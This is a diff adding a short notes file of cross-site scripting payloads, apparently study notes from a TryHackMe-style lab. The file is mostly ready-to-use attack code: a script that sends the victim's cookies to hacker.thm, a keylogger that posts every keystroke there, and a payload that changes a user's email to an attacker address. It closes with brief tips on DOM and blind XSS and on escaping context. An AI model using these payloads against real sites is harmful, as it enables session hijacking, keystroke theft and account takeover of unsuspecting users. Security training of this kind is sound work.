@@ -1,0 +1,20 @@
+1. poc <script>alert('XSS');</script>
+
+2. session tokern stealing when we have a website we can control like hacer.thm
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+
+3.keylogger
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+
+4. busoness logic
+<script>user.changeEmail('attacker@hacker.thm');</script>
+
+for DOM
+"window.location.x
+
+for blind
+xss hunter express
+
+alway seethe context in whcih it is sent and 
+try to bypass the restriction of excape element
+
